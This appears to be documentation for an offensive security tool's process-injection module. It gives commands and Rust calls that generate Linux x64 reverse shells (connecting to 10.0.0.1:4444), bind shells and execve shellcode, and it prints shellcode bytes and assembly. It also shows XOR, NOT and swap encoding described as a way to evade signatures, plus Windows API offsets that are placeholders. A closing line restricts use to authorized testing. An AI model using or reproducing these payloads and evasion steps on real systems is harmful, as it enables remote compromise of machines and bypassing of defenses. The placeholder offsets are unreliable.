# Process Injection

> Generate shellcode and process injection payloads.

## Overview

The `inject` resource provides:
- Linux x64 shellcode templates
- Shellcode encoding/obfuscation
- Common API function offsets
- Injection technique templates

## Commands

| Command | Description |
|---------|-------------|
| `shellcode` | Generate shellcode (shell, reverse, bind) |
| `encode` | Encode shellcode (XOR, NOT, swap) |
| `list` | List common API offsets |

## Usage

### Generate Shellcode

```bash
# Simple /bin/sh exec
rb evasion inject shellcode shell

# Reverse shell
rb evasion inject shellcode reverse --ip 10.0.0.1 --port 4444

# Bind shell
rb evasion inject shellcode bind --port 4444
```

Output:
```
▸ Shellcode Generator

ℹ Linux x64 reverse shell (10.0.0.1:4444)

  Size        74 bytes
  Null-free   true

ℹ Hex:
    4831f65648bf2f62696e2f2f7368...

ℹ C array:
    unsigned char shellcode[] = {
        0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62,
        0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
        ...
    };
```

### Encode Shellcode

```bash
# XOR encode
rb evasion inject encode xor --key 0x41

# NOT encode
rb evasion inject encode not

# Byte swap
rb evasion inject encode swap
```

### List API Offsets

```bash
rb evasion inject list
```

Output:
```
▸ Common API Offsets (Windows x64)

  Kernel32.dll:
    LoadLibraryA:        0x1234
    GetProcAddress:      0x5678
    VirtualAlloc:        0x9ABC
    CreateThread:        0xDEF0

  ntdll.dll:
    NtAllocateVirtualMemory: 0x...
    NtWriteVirtualMemory:    0x...
```

## Shellcode Types

### execve(/bin/sh) - 23 bytes

```nasm
; Linux x64 execve("/bin/sh", NULL, NULL)
xor rsi, rsi
push rsi
mov rdi, 0x68732f2f6e69622f  ; "/bin//sh"
push rdi
push rsp
pop rdi
push 59         ; sys_execve
pop rax
cdq
syscall
```

### Reverse Shell

Connects back to attacker:

```rust
let shellcode = Shellcode::linux_x64_reverse_shell(
    [10, 0, 0, 1],  // IP
    4444            // Port
);
```

### Bind Shell

Listens on port:

```rust
let shellcode = Shellcode::linux_x64_bind_shell(4444);
```

## Encoding Techniques

| Technique | Description | Use Case |
|-----------|-------------|----------|
| **XOR** | XOR with key | Evade signatures |
| **NOT** | Bitwise NOT | Simple obfuscation |
| **Swap** | Swap adjacent bytes | Break patterns |
| **Add/Sub** | Arithmetic encoding | Complex obfuscation |

## Programmatic Usage

```rust
use redblue::modules::evasion::inject::{Shellcode, Architecture};

// Generate shellcode
let sc = Shellcode::linux_x64_reverse_shell([10, 0, 0, 1], 4444);

// Get bytes
let bytes = sc.bytes();
println!("Size: {} bytes", sc.len());

// Check for null bytes
let has_nulls = bytes.contains(&0);
println!("Null-free: {}", !has_nulls);

// Encode
let encoded = sc.xor_encode(0x41);
```

## Warning

Process injection techniques are for **authorized testing only**. Unauthorized use is illegal.

## Related

- [apihash](06-apihash.md) - API hashing for dynamic resolution
- [memory](04-memory.md) - Memory protection
- [amsi](10-amsi.md) - AMSI bypass (Windows)
